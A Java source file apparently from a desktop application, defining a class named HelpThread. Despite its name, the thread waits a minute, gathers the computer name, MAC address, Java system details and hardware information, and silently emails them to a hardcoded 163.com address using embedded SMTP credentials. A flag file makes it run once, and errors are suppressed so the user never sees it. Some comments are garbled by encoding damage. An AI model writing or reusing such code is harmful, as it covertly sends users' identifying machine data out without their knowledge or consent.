package org.boc.help;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import org.boc.ui.BasicJTabbedPane;
import org.boc.util.Messages;
import org.boc.util.Public;

public class HelpThread extends Thread{
	Env env = new Env();
	MailUtil mail ;
	StringBuilder sb = new StringBuilder();
	String computerName ;
	BasicJTabbedPane bpane;  //Ϊ�˱���pass
	
	public HelpThread(BasicJTabbedPane bpane) {
		this.bpane = bpane;
		mail = new MailUtil(bpane);
	}
	@Override
	public void run() {				
		try {
			if(bpane==null) return;
			Thread.sleep(1*60*1000);
			computerName = env.getComputerName();
			sb.append(env.getJavaSystem());
			sb.append(env.getWindowsMACAddress()); 
			sb.append(computerName);
			//�˾����������⣬�������ε���
			//sb.append(env.getMemoryInfo());
			sb.append(env.getPhisicalInfo());
			//System.out.println(sb.toString());
			if(getFlag())
				mail.send("smtp.163.com", "vandh@163.com", "223789", computerName, sb.toString(), "vandh@163.com");
		} catch (Exception e) {
			//Messages.info(e.toString());
			//e.printStackTrace();
		}
	}
	
	/**
	 * ��ȡ�ļ���־��û�оʹ���һ����Ȼ�󷵻�true���оͷ���false
	 */
	public boolean getFlag() {
		File file  = new File(Public.DATA+File.separator+"zz.dat");
		if(!file.exists()) {
			try {
				FileWriter fw = new FileWriter(file);
				fw.close();
				return true;
			} catch (IOException e) {}			
		}
		return false;
	}
}
